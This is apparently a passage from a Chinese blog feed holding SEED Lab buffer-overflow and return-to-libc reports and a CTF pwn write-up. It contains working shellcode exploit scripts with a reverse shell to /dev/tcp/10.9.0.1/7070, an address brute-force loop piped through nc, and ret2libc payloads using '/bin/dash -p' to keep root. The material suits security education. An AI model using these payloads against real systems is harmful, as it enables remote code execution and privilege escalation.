<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash	-i &gt;/dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1          *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd7e8</span>     <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0xffffd7e8</span> - <span class="number">0xffffd778</span> + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功获取到root权限shell。</p>
<img src="/posts/637eab0b/level1-result.png" class="" title="level1-result">

<h3 id="Task-3：Level-2-Attack"><a href="#Task-3：Level-2-Attack" class="headerlink" title="Task 3：Level-2 Attack"></a>Task 3：Level-2 Attack</h3><p>buffer大小未知，可以通过喷射法来填充大量地址。</p>
<p>向server2发送nc连接请求，获取到buffer地址</p>
<img src="/posts/637eab0b/server2-echo%20hello.png" class="" title="server2-echo hello">

<p>构造python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd728</span> + start    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">300</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[<span class="number">0</span>:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)*<span class="number">76</span></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>



<p>获取到shell</p>
<img src="/posts/637eab0b/level2-result.png" class="" title="level2-result">

<h3 id="Task-4：Level-3-Attack"><a href="#Task-4：Level-3-Attack" class="headerlink" title="Task 4：Level-3 Attack"></a>Task 4：Level-3 Attack</h3><p>向server3发送nc连接请求，发现可以看到rbp和buffer地址。通过将shellcode放在ret前解决。</p>
<img src="/posts/637eab0b/echo-hello-server3.png" class="" title="echo-hello-server3">

<p>构造python脚本如下，已知rbp和buffer地址，将shellcode放在前面即可，此处直接设置start为0：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffe650</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x7fffffffe720</span> - <span class="number">0x7fffffffe650</span> + <span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>获取到root权限的shell：</p>
<img src="/posts/637eab0b/echo-hello-server3.png" class="" title="echo-hello-server3">

<h3 id="Task-5：Level-4-Attack"><a href="#Task-5：Level-4-Attack" class="headerlink" title="Task 5：Level-4 Attack"></a>Task 5：Level-4 Attack</h3><p>向server4发送nc连接请求，但是buffer size很小，由返回结果可知buffer size为0x60，为96长度，小于shellcode长度，因此考虑使用main函数fread参数的shellcode，由于地址离rbp较远且无法得知，因此尝试遍历爆破出结果，此处应尽量保证shellcode前有尽可能多的nop指令，所以start可以设置为末尾。</p>
<img src="/posts/637eab0b/ehco-hello-server3.png" class="" title="ehco-hello-server3">

<p>构造python脚本如下，使用循环向server4发送请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffe650</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x60</span> + <span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">  ret += <span class="number">40</span></span><br><span class="line">  <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">  content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">  <span class="comment">##################################################################</span></span><br><span class="line">  <span class="comment"># Write the content to a file</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;ret: <span class="subst">&#123;ret&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(os.system(<span class="string">&quot;cat badfile | nc 10.9.0.8 9090&quot;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>python运行如下，结果会停在某个地址，表示在此ret地址下可以成功建立连接。</p>
<img src="/posts/637eab0b/level4-result-1.png" class="" title="level4-result-1">

<p>获取server4 root权限shell：</p>
<img src="/posts/637eab0b/level4-result-2.png" class="" title="level4-result-2">

<h3 id="Task-6-Experimenting-with-the-Address-Randomization"><a href="#Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task 6: Experimenting with the Address Randomization"></a>Task 6: Experimenting with the Address Randomization</h3><p>开启ASLR机制后，向server1和server2发送<code>echo hello | nc 10.9.0.* 9090</code>请求，查看rbp和buffer地址。</p>
<p> <code>server1</code></p>
<img src="/posts/637eab0b/%E5%BC%80%E5%90%AFASLR%E5%90%8Eserver1.png" class="" title="开启ASLR后server1">

<p><code>server2</code></p>
<img src="/posts/637eab0b/%E5%BC%80%E5%90%AFASLR%E5%90%8Eserver2.png" class="" title="image-20231024231535611">

<p>可以看出rbp和buffer地址每次都会改变，即ASLR机制会在程序加载时随机化程序在内存地址</p>
<p>尝试暴力破解：（运行17分钟没有爆破成功…）</p>
<img src="/posts/637eab0b/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-server.png" class="" title="暴力破解">

<h3 id="Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 7: Experimenting with Other Countermeasures"></a>Tasks 7: Experimenting with Other Countermeasures</h3><ol>
<li><p><strong>Task 7.a: Turn on the StackGuard Protection</strong>  </p>
<p>setuid实验已完成此项重复内容，此处不在赘述</p>
</li>
<li><p><strong>Task 7.b: Turn on the Non-executable Stack Protection</strong>  </p>
<p> setuid实验已完成此项重复内容，此处不在赘述</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>缓冲区溢出</tag>
        <tag>SEED_Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016 WriteUp</title>
    <url>/posts/3d8ffbc0.html</url>
    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>对栈溢出函数带参数的溢出理解</li>
</ul>
<h2 id="解题内容"><a href="#解题内容" class="headerlink" title="解题内容"></a>解题内容</h2><ol>
<li><p>使用<code>checksec</code>工具查看基本信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ~/.local/bin/checksec ./get_started_3dsctf_2016</span><br><span class="line">[*] &#x27;/home/bronya/Documents/ctf/pwn/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看到为32位程序，只开了nx防护。</p>
</li>
<li><p>ida工具打开程序，反编译，有主要函数<code>main</code>，<code>get_flag</code></p>
<p><code>main</code>：</p>


<p><code>get_flag</code>：</p>


<p>存在漏洞点为<code>main</code>函数中的<code>gets(v4)</code>，因此可以通过此进行栈溢出将返回地址改为<code>get_flag</code>函数地址，获取flag</p>
</li>
<li><p>在本地测试成功，但是进行远程测试出现问题，发现远程程序崩溃了，应该是因为栈的数据被破坏，导致程序无法完整运行：</p>

</li>
<li><p>考虑在<code>get_flag</code>后加上<code>exit</code>函数以及<code>get_flag</code>所需的两个参数，使其正常完成并退出。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 25523)</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span></span><br><span class="line">retn = <span class="number">0x08048A40</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x8048A3B&#x27;)</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>, get_flag, exit)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功获取flag</p>

</li>
<li><p>另外还有一种思路是程序中存在mprotect函数，可以修改程序中某一段地址的读写执行权限，因此可以将某段bss地址修改，并写入shellcode，令程序跳转到bss地址即可拿到shell。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>【SEED Lab2.0】Return_to_Libc实验报告</title>
    <url>/posts/53f1e8f.html</url>
    <content><![CDATA[<h3 id="Task1：Finding-out-the-Addresses-of-libc-Functions"><a href="#Task1：Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task1：Finding out the Addresses of libc Functions"></a>Task1：Finding out the Addresses of libc Functions</h3><ol>
<li><p>获取system函数和exit函数地址</p>
<img src="/posts/53f1e8f/%E8%8E%B7%E5%8F%96system%E5%92%8Cexit%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" class="" title="获取system和exit函数地址">
</li>
<li><p>gdb批处理命令，新建文件<code>peda-session-retlib.txt</code>，进行批处理操作</p>
<img src="/posts/53f1e8f/batch%E5%A4%84%E7%90%86gdb.png" class="" title="batch处理gdb"></li>
</ol>
<h3 id="Task2：Putting-the-shell-string-in-the-memory"><a href="#Task2：Putting-the-shell-string-in-the-memory" class="headerlink" title="Task2：Putting the shell string in the memory"></a>Task2：Putting the shell string in the memory</h3><ol>
<li><p>编写<code>getprt.c</code>来获取环境变量地址</p>
<p><code>getprt.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (shell)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置<code>/bin/sh</code>的环境变量，获得地址：</p>
<img src="/posts/53f1e8f/getprt.png" class="" title="getprt">

<p>将代码加入到retlib.c中，获取到地址，可以发现地址与<code>getprt</code>的地址相同。（如果开启aslr或者两文件名长度不同则会不同）</p>
<img src="/posts/53f1e8f/retlib.png" class="" title="retlib">

<h3 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h3><ol>
<li><p>构造python脚本，进行攻击</p>
<p><code>exploit.py</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Y = <span class="number">0xffffcd58</span> - <span class="number">0xffffcd40</span> + <span class="number">4</span></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span>   <span class="comment"># The address of system()</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (system_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = Y + <span class="number">8</span></span><br><span class="line">sh_addr = <span class="number">0xffffd3e5</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (sh_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = Y + <span class="number">4</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>攻击结果如下：</p>
<img src="/posts/53f1e8f/exploit.png" class="" title="exploit">
</li>
<li><p>Attack variation 1: 删去exit()函数地址 ，发现虽然可以成功获取命令行，但是无法正常退出。</p>
<img src="/posts/53f1e8f/%E5%88%A0%E5%8E%BBexit.png" class="" title="删去exit">
</li>
<li><p>Attack variation 2:修改retlib函数长度为newretlib，发现地址发生变化，无法正确执行命令。</p>
<img src="/posts/53f1e8f/%E4%BF%AE%E6%94%B9%E9%95%BF%E5%BA%A6.png" class="" title="修改长度"></li>
</ol>
<h3 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h3><ol>
<li><p>将&#x2F;bin&#x2F;sh与&#x2F;bin&#x2F;dash链接，重新进行实验。</p>
<p>虽然&#x2F;bin&#x2F;sh和&#x2F;bin&#x2F;dash都会对用户setuid权限进行检查，导致无法获取到root权限，但是如果加上-p参数，就可以绕过。可以让程序直接执行”&#x2F;bin&#x2F;dash -p”命令获取root权限。</p>
</li>
<li><p>获取execv函数地址：</p>
<img src="/posts/53f1e8f/execv%E5%9C%B0%E5%9D%80.png" class="" title="execv地址">
</li>
<li><p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line">start = <span class="number">28</span></span><br><span class="line"></span><br><span class="line">execv_addr = <span class="number">0xf7e994b0</span>    <span class="comment"># The address of system()</span></span><br><span class="line">content[start:start+<span class="number">4</span>] = (execv_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The first argument of execv()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[start+<span class="number">4</span>:start+<span class="number">8</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bash_addr = <span class="number">0xffffd3e2</span>       <span class="comment"># The address of &quot;/bin/dash&quot;</span></span><br><span class="line">p_addr = <span class="number">0xffffde99</span> <span class="comment"># The address of &quot;-p&quot;</span></span><br><span class="line">content[start+<span class="number">8</span>:start+<span class="number">12</span>] = (bash_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The second argument of execv()</span></span><br><span class="line">argv = <span class="number">0xffffcd78</span> + <span class="number">504</span>   <span class="comment"># address of argv[]</span></span><br><span class="line">content[start+<span class="number">12</span>: start+<span class="number">16</span>] = (argv).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Construct the argv[] array</span></span><br><span class="line">arg1_addr = bash_addr</span><br><span class="line">arg2_addr = 